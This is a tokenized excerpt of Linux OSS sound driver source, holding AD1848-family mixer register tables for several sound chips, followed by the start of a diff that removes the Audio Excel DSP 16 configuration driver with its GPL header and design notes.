"SOUND_MASK_LINE1", "|", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_LINE2", "|", "\\", "SOUND_MASK_IGAIN", "|", "\\", "SOUND_MASK_PCM", "|", "SOUND_MASK_IMIX", ")", "#", "define", "MODE2_MIXER_DEVICES", "(", "SOUND_MASK_LINE1", "|", "SOUND_MASK_LINE2", "|", "\\", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_LINE3", "|", "SOUND_MASK_SPEAKER", "|", "\\", "SOUND_MASK_IGAIN", "|", "\\", "SOUND_MASK_PCM", "|", "SOUND_MASK_IMIX", ")", "#", "define", "MODE3_MIXER_DEVICES", "(", "MODE2_MIXER_DEVICES", "|", "SOUND_MASK_VOLUME", ")", "/", "*", "OPTi", "82C930", "has", "no", "IMIX", "level", "control", ",", "but", "it", "can", "still", "be", "selected", "as", "an", "*", "input", "*", "/", "#", "define", "C930_MIXER_DEVICES", "(", "SOUND_MASK_LINE1", "|", "SOUND_MASK_LINE2", "|", "\\", "SOUND_MASK_MIC", "|", "SOUND_MASK_VOLUME", "|", "\\", "SOUND_MASK_LINE3", "|", "\\", "SOUND_MASK_IGAIN", "|", "SOUND_MASK_PCM", ")", "#", "define", "SPRO_MIXER_DEVICES", "(", "SOUND_MASK_VOLUME", "|", "SOUND_MASK_PCM", "|", "\\", "SOUND_MASK_LINE", "|", "SOUND_MASK_SYNTH", "|", "\\", "SOUND_MASK_CD", "|", "SOUND_MASK_MIC", "|", "\\", "SOUND_MASK_SPEAKER", "|", "SOUND_MASK_LINE1", "|", "\\", "SOUND_MASK_OGAIN", ")", "struct", "mixer_def", "{", "unsigned", "int", "regno", ":", "6", ";", "/", "*", "register", "number", "for", "volume", "*", "/", "unsigned", "int", "polarity", ":", "1", ";", "/", "*", "volume", "polarity", ":", "0", "=", "normal", ",", "1", "=", "reversed", "*", "/", "unsigned", "int", "bitpos", ":", "3", ";", "/", "*", "position", "of", "bits", "in", "register", "for", "volume", "*", "/", "unsigned", "int", "nbits", ":", "3", ";", "/", "*", "number", "of", "bits", "in", "register", "for", "volume", "*", "/", "unsigned", "int", "mutereg", ":", "6", ";", "/", "*", "register", "number", "for", "mute", "bit", "*", "/", "unsigned", "int", "mutepol", ":", "1", ";", "/", "*", "mute", "polarity", ":", "0", "=", "normal", ",", "1", "=", "reversed", "*", "/", "unsigned", "int", "mutepos", ":", "4", ";", "/", "*", "position", "of", "mute", "bit", "in", "register", "*", "/", "unsigned", "int", "recreg", ":", "6", ";", "/", "*", "register", "number", "for", "recording", "bit", "*", "/", "unsigned", "int", "recpol", ":", "1", ";", "/", "*", "recording", "polarity", ":", "0", "=", "normal", ",", "1", "=", "reversed", "*", "/", "unsigned", "int", "recpos", ":", "4", ";", "/", "*", "position", "of", "recording", "bit", "in", "register", "*", "/", "}", ";", "static", "char", "mix_cvt", "[", "101", "]", "=", "{", "0", ",", "0", ",", "3", ",", "7", ",", "10", ",", "13", ",", "16", ",", "19", ",", "21", ",", "23", ",", "26", ",", "28", ",", "30", ",", "32", ",", "34", ",", "35", ",", "37", ",", "39", ",", "40", ",", "42", ",", "43", ",", "45", ",", "46", ",", "47", ",", "49", ",", "50", ",", "51", ",", "52", ",", "53", ",", "55", ",", "56", ",", "57", ",", "58", ",", "59", ",", "60", ",", "61", ",", "62", ",", "63", ",", "64", ",", "65", ",", "65", ",", "66", ",", "67", ",", "68", ",", "69", ",", "70", ",", "70", ",", "71", ",", "72", ",", "73", ",", "73", ",", "74", ",", "75", ",", "75", ",", "76", ",", "77", ",", "77", ",", "78", ",", "79", ",", "79", ",", "80", ",", "81", ",", "81", ",", "82", ",", "82", ",", "83", ",", "84", ",", "84", ",", "85", ",", "85", ",", "86", ",", "86", ",", "87", ",", "87", ",", "88", ",", "88", ",", "89", ",", "89", ",", "90", ",", "90", ",", "91", ",", "91", ",", "92", ",", "92", ",", "93", ",", "93", ",", "94", ",", "94", ",", "95", ",", "95", ",", "96", ",", "96", ",", "96", ",", "97", ",", "97", ",", "98", ",", "98", ",", "98", ",", "99", ",", "99", ",", "100", "}", ";", "typedef", "struct", "mixer_def", "mixer_ent", ";", "typedef", "mixer_ent", "mixer_ents", "[", "2", "]", ";", "/", "*", "*", "Most", "of", "the", "mixer", "entries", "work", "in", "backwards", ".", "Setting", "the", "polarity", "field", "*", "makes", "them", "to", "work", "correctly", ".", "*", "*", "The", "channel", "numbering", "used", "by", "individual", "sound", "cards", "is", "not", "fixed", ".", "Some", "*", "cards", "have", "assigned", "different", "meanings", "for", "the", "AUX1", ",", "AUX2", "and", "LINE", "inputs", ".", "*", "The", "current", "version", "doesn", "'", "t", "try", "to", "compensate", "this", ".", "*", "/", "#", "define", "MIX_ENT", "(", "name", ",", "reg_l", ",", "pola_l", ",", "pos_l", ",", "len_l", ",", "reg_r", ",", "pola_r", ",", "pos_r", ",", "len_r", ",", "mute_bit", ")", "\\", "[", "name", "]", "=", "{", "{", "reg_l", ",", "pola_l", ",", "pos_l", ",", "len_l", ",", "reg_l", ",", "0", ",", "mute_bit", ",", "0", ",", "0", ",", "8", "}", ",", "\\", "{", "reg_r", ",", "pola_r", ",", "pos_r", ",", "len_r", ",", "reg_r", ",", "0", ",", "mute_bit", ",", "0", ",", "0", ",", "8", "}", "}", "#", "define", "MIX_ENT2", "(", "name", ",", "reg_l", ",", "pola_l", ",", "pos_l", ",", "len_l", ",", "mute_reg_l", ",", "mute_pola_l", ",", "mute_pos_l", ",", "\\", "rec_reg_l", ",", "rec_pola_l", ",", "rec_pos_l", ",", "\\", "reg_r", ",", "pola_r", ",", "pos_r", ",", "len_r", ",", "mute_reg_r", ",", "mute_pola_r", ",", "mute_pos_r", ",", "\\", "rec_reg_r", ",", "rec_pola_r", ",", "rec_pos_r", ")", "\\", "[", "name", "]", "=", "{", "{", "reg_l", ",", "pola_l", ",", "pos_l", ",", "len_l", ",", "mute_reg_l", ",", "mute_pola_l", ",", "mute_pos_l", ",", "\\", "rec_reg_l", ",", "rec_pola_l", ",", "rec_pos_l", "}", ",", "\\", "{", "reg_r", ",", "pola_r", ",", "pos_r", ",", "len_r", ",", "mute_reg_r", ",", "mute_pola_r", ",", "mute_pos_r", ",", "\\", "rec_reg_r", ",", "rec_pola_r", ",", "rec_pos_r", "}", "}", "static", "mixer_ents", "ad1848_mix_devices", "[", "32", "]", "=", "{", "MIX_ENT", "(", "SOUND_MIXER_VOLUME", ",", "27", ",", "1", ",", "0", ",", "4", ",", "29", ",", "1", ",", "0", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_BASS", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_TREBLE", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SYNTH", ",", "4", ",", "1", ",", "0", ",", "5", ",", "5", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_PCM", ",", "6", ",", "1", ",", "0", ",", "6", ",", "7", ",", "1", ",", "0", ",", "6", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SPEAKER", ",", "26", ",", "1", ",", "0", ",", "4", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE", ",", "18", ",", "1", ",", "0", ",", "5", ",", "19", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_MIC", ",", "0", ",", "0", ",", "5", ",", "1", ",", "1", ",", "0", ",", "5", ",", "1", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_CD", ",", "2", ",", "1", ",", "0", ",", "5", ",", "3", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IMIX", ",", "13", ",", "1", ",", "2", ",", "6", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_ALTPCM", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_RECLEV", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IGAIN", ",", "0", ",", "0", ",", "0", ",", "4", ",", "1", ",", "0", ",", "0", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_OGAIN", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE1", ",", "2", ",", "1", ",", "0", ",", "5", ",", "3", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE2", ",", "4", ",", "1", ",", "0", ",", "5", ",", "5", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE3", ",", "18", ",", "1", ",", "0", ",", "5", ",", "19", ",", "1", ",", "0", ",", "5", ",", "7", ")", "}", ";", "static", "mixer_ents", "iwave_mix_devices", "[", "32", "]", "=", "{", "MIX_ENT", "(", "SOUND_MIXER_VOLUME", ",", "25", ",", "1", ",", "0", ",", "5", ",", "27", ",", "1", ",", "0", ",", "5", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_BASS", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_TREBLE", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SYNTH", ",", "4", ",", "1", ",", "0", ",", "5", ",", "5", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_PCM", ",", "6", ",", "1", ",", "0", ",", "6", ",", "7", ",", "1", ",", "0", ",", "6", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SPEAKER", ",", "26", ",", "1", ",", "0", ",", "4", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE", ",", "18", ",", "1", ",", "0", ",", "5", ",", "19", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_MIC", ",", "0", ",", "0", ",", "5", ",", "1", ",", "1", ",", "0", ",", "5", ",", "1", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_CD", ",", "2", ",", "1", ",", "0", ",", "5", ",", "3", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IMIX", ",", "16", ",", "1", ",", "0", ",", "5", ",", "17", ",", "1", ",", "0", ",", "5", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_ALTPCM", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_RECLEV", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IGAIN", ",", "0", ",", "0", ",", "0", ",", "4", ",", "1", ",", "0", ",", "0", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_OGAIN", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE1", ",", "2", ",", "1", ",", "0", ",", "5", ",", "3", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE2", ",", "4", ",", "1", ",", "0", ",", "5", ",", "5", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE3", ",", "18", ",", "1", ",", "0", ",", "5", ",", "19", ",", "1", ",", "0", ",", "5", ",", "7", ")", "}", ";", "static", "mixer_ents", "cs42xb_mix_devices", "[", "32", "]", "=", "{", "/", "*", "Digital", "master", "volume", "actually", "has", "seven", "bits", ",", "but", "we", "only", "use", "six", "to", "avoid", "the", "discontinuity", "when", "the", "analog", "gain", "kicks", "in", ".", "*", "/", "MIX_ENT", "(", "SOUND_MIXER_VOLUME", ",", "46", ",", "1", ",", "0", ",", "6", ",", "47", ",", "1", ",", "0", ",", "6", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_BASS", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_TREBLE", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SYNTH", ",", "4", ",", "1", ",", "0", ",", "5", ",", "5", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_PCM", ",", "6", ",", "1", ",", "0", ",", "6", ",", "7", ",", "1", ",", "0", ",", "6", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SPEAKER", ",", "26", ",", "1", ",", "0", ",", "4", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE", ",", "18", ",", "1", ",", "0", ",", "5", ",", "19", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_MIC", ",", "34", ",", "1", ",", "0", ",", "5", ",", "35", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_CD", ",", "2", ",", "1", ",", "0", ",", "5", ",", "3", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "/", "*", "For", "the", "IMIX", "entry", ",", "it", "was", "not", "possible", "to", "use", "the", "MIX_ENT", "macro", "because", "the", "mute", "bit", "is", "in", "different", "positions", "for", "the", "two", "channels", "and", "requires", "reverse", "polarity", ".", "*", "/", "[", "SOUND_MIXER_IMIX", "]", "=", "{", "{", "13", ",", "1", ",", "2", ",", "6", ",", "13", ",", "1", ",", "0", ",", "0", ",", "0", ",", "8", "}", ",", "{", "42", ",", "1", ",", "0", ",", "6", ",", "42", ",", "1", ",", "7", ",", "0", ",", "0", ",", "8", "}", "},", "MIX_ENT", "(", "SOUND_MIXER_ALTPCM", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_RECLEV", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IGAIN", ",", "0", ",", "0", ",", "0", ",", "4", ",", "1", ",", "0", ",", "0", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_OGAIN", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE1", ",", "2", ",", "1", ",", "0", ",", "5", ",", "3", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE2", ",", "4", ",", "1", ",", "0", ",", "5", ",", "5", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE3", ",", "38", ",", "1", ",", "0", ",", "6", ",", "39", ",", "1", ",", "0", ",", "6", ",", "7", ")", "}", ";", "/", "*", "OPTi", "82C930", "has", "somewhat", "different", "port", "addresses", ".", "*", "Note", ":", "VOLUME", "=", "=", "SPEAKER", ",", "SYNTH", "=", "=", "LINE2", ",", "LINE", "=", "=", "LINE3", ",", "CD", "=", "=", "LINE1", "*", "VOLUME", ",", "SYNTH", ",", "LINE", ",", "CD", "are", "not", "enabled", "above", ".", "*", "MIC", "is", "level", "of", "mic", "monitoring", "direct", "to", "output", ".", "Same", "for", "CD", ",", "LINE", ",", "etc", ".", "*", "/", "static", "mixer_ents", "c930_mix_devices", "[", "32", "]", "=", "{", "MIX_ENT", "(", "SOUND_MIXER_VOLUME", ",", "22", ",", "1", ",", "1", ",", "5", ",", "23", ",", "1", ",", "1", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_BASS", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_TREBLE", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SYNTH", ",", "4", ",", "1", ",", "1", ",", "4", ",", "5", ",", "1", ",", "1", ",", "4", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_PCM", ",", "6", ",", "1", ",", "0", ",", "5", ",", "7", ",", "1", ",", "0", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SPEAKER", ",", "22", ",", "1", ",", "1", ",", "5", ",", "23", ",", "1", ",", "1", ",", "5", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE", ",", "18", ",", "1", ",", "1", ",", "4", ",", "19", ",", "1", ",", "1", ",", "4", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_MIC", ",", "20", ",", "1", ",", "1", ",", "4", ",", "21", ",", "1", ",", "1", ",", "4", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_CD", ",", "2", ",", "1", ",", "1", ",", "4", ",", "3", ",", "1", ",", "1", ",", "4", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IMIX", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_ALTPCM", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_RECLEV", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IGAIN", ",", "0", ",", "0", ",", "0", ",", "4", ",", "1", ",", "0", ",", "0", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_OGAIN", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE1", ",", "2", ",", "1", ",", "1", ",", "4", ",", "3", ",", "1", ",", "1", ",", "4", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE2", ",", "4", ",", "1", ",", "1", ",", "4", ",", "5", ",", "1", ",", "1", ",", "4", ",", "7", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_LINE3", ",", "18", ",", "1", ",", "1", ",", "4", ",", "19", ",", "1", ",", "1", ",", "4", ",", "7", ")", "}", ";", "static", "mixer_ents", "spro_mix_devices", "[", "32", "]", "=", "{", "MIX_ENT", "(", "SOUND_MIXER_VOLUME", ",", "19", ",", "0", ",", "4", ",", "4", ",", "19", ",", "0", ",", "0", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_BASS", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_TREBLE", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT2", "(", "SOUND_MIXER_SYNTH", ",", "4", ",", "1", ",", "1", ",", "4", ",", "23", ",", "0", ",", "3", ",", "0", ",", "0", ",", "8", ",", "5", ",", "1", ",", "1", ",", "4", ",", "23", ",", "0", ",", "3", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_PCM", ",", "6", ",", "1", ",", "1", ",", "4", ",", "7", ",", "1", ",", "1", ",", "4", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_SPEAKER", ",", "18", ",", "0", ",", "3", ",", "2", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT2", "(", "SOUND_MIXER_LINE", ",", "20", ",", "0", ",", "4", ",", "4", ",", "17", ",", "1", ",", "4", ",", "16", ",", "0", ",", "2", ",", "20", ",", "0", ",", "0", ",", "4", ",", "17", ",", "1", ",", "3", ",", "16", ",", "0", ",", "1", ")", ",", "MIX_ENT2", "(", "SOUND_MIXER_MIC", ",", "18", ",", "0", ",", "0", ",", "3", ",", "17", ",", "1", ",", "0", ",", "16", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ")", ",", "MIX_ENT2", "(", "SOUND_MIXER_CD", ",", "21", ",", "0", ",", "4", ",", "4", ",", "17", ",", "1", ",", "2", ",", "16", ",", "0", ",", "4", ",", "21", ",", "0", ",", "0", ",", "4", ",", "17", ",", "1", ",", "1", ",", "16", ",", "0", ",", "3", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IMIX", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_ALTPCM", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_RECLEV", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_IGAIN", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "MIX_ENT", "(", "SOUND_MIXER_OGAIN", ",", "17", ",", "1", ",", "6", ",", "1", ",", "0", ",", "0", ",", "0", ",", "0", ",", "8", ")", ",", "/", "*", "This", "is", "external", "wavetable", "*", "/", "MIX_ENT2", "(", "SOUND_MIXER_LINE1", ",", "22", ",", "0", ",", "4", ",", "4", ",", "23", ",", "1", ",", "1", ",", "23", ",", "0", ",", "4", ",", "22", ",", "0", ",", "0", ",", "4", ",", "23", ",", "1", ",", "0", ",", "23", ",", "0", ",", "5", ")", ",", "}", ";", "static", "int", "default_mixer_levels", "[", "32", "]", "=", "{", "0x3232", ",", "/", "*", "Master", "Volume", "*", "/", "0x3232", ",", "/", "*", "Bass", "*", "/", "0x3232", ",", "/", "*", "Treble", "*", "/", "0x4b4b", ",", "/", "*", "FM", "*", "/", "0x3232", ",", "/", "*", "PCM", "*", "/", "0x1515", ",", "/", "*", "PC", "Speaker", "*", "/", "0x2020", ",", "/", "*", "Ext", "Line", "*", "/", "0x1010", ",", "/", "*", "Mic", "*", "/", "0x4b4b", ",", "/", "*", "CD", "*", "/", "0x0000", ",", "/", "*", "Recording", "monitor", "*", "/", "0x4b4b", ",", "/", "*", "Second", "PCM", "*", "/", "0x4b4b", ",", "/", "*", "Recording", "level", "*", "/", "0x4b4b", ",", "/", "*", "Input", "gain", "*", "/", "0x4b4b", ",", "/", "*", "Output", "gain", "*", "/", "0x2020", ",", "/", "*", "Line1", "*", "/", "0x2020", ",", "/", "*", "Line2", "*", "/", "0x1515", "/", "*", "Line3", "(", "usually", "line", "in", ")", "*/", "}", ";", "#", "define", "LEFT_CHN", "0", "#", "define", "RIGHT_CHN", "1", "/", "*", "*", "Channel", "enable", "bits", "for", "ioctl", "(", "SOUND_MIXER_PRIVATE1", ")", "*", "/", "#", "ifndef", "AUDIO_SPEAKER", "#", "define", "AUDIO_SPEAKER", "0x01", "/", "*", "Enable", "mono", "output", "*", "/", "#", "define", "AUDIO_HEADPHONE", "0x02", "/", "*", "Sparc", "only", "*", "/", "#", "define", "AUDIO_LINE_OUT", "0x04", "/", "*", "Sparc", "only", "*", "/", "#", "endif", "@", "@", "-", "1", ",", "1373", "+", "0", ",", "0", "@", "@", "/", "*", "sound", "/", "oss", "/", "aedsp16", ".", "c", "Audio", "Excel", "DSP", "16", "software", "configuration", "routines", "Copyright", "(", "C", ")", "1995", ",", "1996", ",", "1997", ",", "1998", "Riccardo", "Facchetti", "(", "fizban", "@", "tin", ".", "it", ")", "This", "program", "is", "free", "software", ";", "you", "can", "redistribute", "it", "and", "/", "or", "modify", "it", "under", "the", "terms", "of", "the", "GNU", "General", "Public", "License", "as", "published", "by", "the", "Free", "Software", "Foundation", ";", "either", "version", "2", "of", "the", "License", ",", "or", "(", "at", "your", "option", ")", "any", "later", "version", ".", "This", "program", "is", "distributed", "in", "the", "hope", "that", "it", "will", "be", "useful", ",", "but", "WITHOUT", "ANY", "WARRANTY", ";", "without", "even", "the", "implied", "warranty", "of", "MERCHANTABILITY", "or", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", ".", "See", "the", "GNU", "General", "Public", "License", "for", "more", "details", ".", "You", "should", "have", "received", "a", "copy", "of", "the", "GNU", "General", "Public", "License", "along", "with", "this", "program", ";", "if", "not", ",", "write", "to", "the", "Free", "Software", "Foundation", ",", "Inc", ".", ",", "675", "Mass", "Ave", ",", "Cambridge", ",", "MA", "02139", ",", "USA", ".", "*", "/", "/", "*", "*", "Include", "the", "main", "OSS", "Lite", "header", "file", ".", "It", "include", "all", "the", "os", ",", "OSS", "Lite", ",", "etc", "*", "headers", "needed", "by", "this", "source", ".", "*", "/", "#", "include", "<", "linux", "/", "delay", ".", "h", ">", "#", "include", "<", "linux", "/", "module", ".", "h", ">", "#", "include", "<", "linux", "/", "init", ".", "h", ">", "#", "include", "\"", "sound_config", ".", "h", "\"", "/", "*", "READ", "THIS", "This", "module", "started", "to", "configure", "the", "Audio", "Excel", "DSP", "16", "Sound", "Card", ".", "Now", "works", "with", "the", "SC", "-", "6000", "(", "old", "aedsp16", ")", "and", "new", "SC", "-", "6600", "based", "cards", ".", "NOTE", ":", "I", "have", "NO", "idea", "about", "Audio", "Excel", "DSP", "16", "III", ".", "If", "someone", "owns", "this", "audio", "card", "and", "want", "to", "see", "the", "kernel", "support", "for", "it", ",", "please", "contact", "me", ".", "Audio", "Excel", "DSP", "16", "is", "an", "SB", "pro", "II", ",", "Microsoft", "Sound", "System", "and", "MPU", "-", "401", "compatible", "card", ".", "It", "is", "software", "-", "only", "configurable", "(", "no", "jumpers", "to", "hard", "-", "set", "irq", "/", "dma", "/", "mpu", "-", "irq", ")", ",", "so", "before", "this", "module", ",", "the", "only", "way", "to", "configure", "the", "DSP", "under", "linux", "was", "boot", "the", "MS", "-", "DOS", "loading", "the", "sound", ".", "sys", "device", "driver", "(", "this", "driver", "soft", "configure", "the", "sound", "board", "hardware", "by", "massaging", "someone", "of", "its", "registers", ")", ",", "and", "then", "ctrl", "-", "alt", "-", "del", "to", "boot", "linux", "with", "the", "DSP", "configured", "by", "the", "DOS", "driver", ".", "This", "module", "works", "configuring", "your", "Audio", "Excel", "DSP", "16", "'", "s", "irq", ",", "dma", "and", "mpu", "-", "401", "-", "irq", ".", "The", "OSS", "Lite", "routines", "rely", "on", "the", "fact", "that", "if", "the", "hardware", "is", "there", ",", "they", "can", "detect", "it", ".", "The", "problem", "with", "AEDSP16", "is", "that", "no", "hardware", "can", "be", "found", "by", "the", "probe", "routines", "if", "the", "sound", "card", "is", "not", "configured", "properly", ".", "Sometimes", "the", "kernel", "probe", "routines", "can", "find", "an", "SBPRO", "even", "when", "the", "card", "is", "not", "configured", "(", "this", "is", "the", "standard", "setup", "of", "the", "card", ")", ",", "but", "the", "SBPRO", "emulation", "don", "'", "t", "work", "well", "if", "the", "card", "is", "not", "properly", "initialized", ".", "For", "this", "reason", "aedsp16_init_board", "(", ")", "routine", "is", "called", "before", "the", "OSS", "Lite", "probe", "routines", "try", "to", "detect", "the", "hardware", ".", "NOTE", "(", "READ", "THE", "NOTE", "TOO", ",", "IT", "CONTAIN", "USEFUL", "INFORMATIONS", ")", "NOTE", ":", "Now", "it", "works", "with", "SC", "-", "6000", "and", "SC", "-", "6600", "based", "audio", "cards", ".", "The", "new", "cards", "have", "no", "jumper", "switch", "at", "all", ".", "No", "more", "WSS", "or", "MPU", "-", "401", "I", "/", "O", "port", "switches", ".", "They", "have", "to", "be", "configured", "by", "software", ".", "NOTE", ":", "The", "driver", "is", "merged", "with", "the", "new", "OSS", "Lite", "sound", "driver", ".", "It", "works", "as", "a", "lowlevel", "driver", ".", "The", "Audio", "Excel", "DSP", "16", "Sound", "Card", "emulates", "both", "SBPRO", "and", "MSS", ";", "the", "OSS", "Lite", "sound", "driver", "can", "be", "configured", "for", "SBPRO", "and", "MSS", "cards", "at", "the", "same", "time", ",", "but", "the", "aedsp16", "can", "'", "t", "be", "two", "cards", "!", "!", "When", "we", "configure", "it", ",", "we", "have", "to", "choose", "the", "SBPRO", "or", "the", "MSS", "emulation", "for", "AEDSP16", ".", "We", "also", "can", "install", "a", "*", "REAL", "*", "card", "of", "the", "other", "type", "(", "see", "[", "1", "]", ").", "NOTE", ":", "If", 